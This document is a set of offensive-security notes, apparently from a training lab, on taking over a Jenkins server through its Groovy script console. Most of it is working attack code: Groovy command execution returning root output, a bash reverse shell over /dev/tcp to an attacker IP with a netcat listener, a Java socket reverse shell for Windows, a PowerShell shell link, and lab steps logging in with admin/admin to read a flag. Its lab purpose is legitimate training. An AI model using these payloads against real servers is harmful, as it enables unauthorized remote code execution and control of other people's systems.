# Attacking Jenkins

The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime.

## Script Console

http://jenkins.inlanefreight.local:8000/script

--> This console allows a user to run Apache Groovy scripts

## Direct web shell

def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

uid=0(root) gid=0(root) groups=0(root)


### Reverse shell

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

nc -lvnp 8443

### Windows : attempt to add a user and connect to the host via RDP or WinRM

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");

String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

## Miscellaneous Vulnerabilities

One recent exploit combines two vulnerabilities, CVE-2018-1999002 and CVE-2019-1003000 to achieve pre-authenticated remote code execution :

https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266


## LAB

IP=10.129.201.58
printf "%s\t%s\n\n" "$IP" "jenkins.inlanefreight.local" | sudo tee -a /etc/hosts

http://jenkins.inlanefreight.local:8000/login?from=%2F

admin
admin

http://jenkins.inlanefreight.local:8000/script

def cmd = 'cat /var/lib/jenkins3/flag.txt'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

f33ling_gr00000vy!
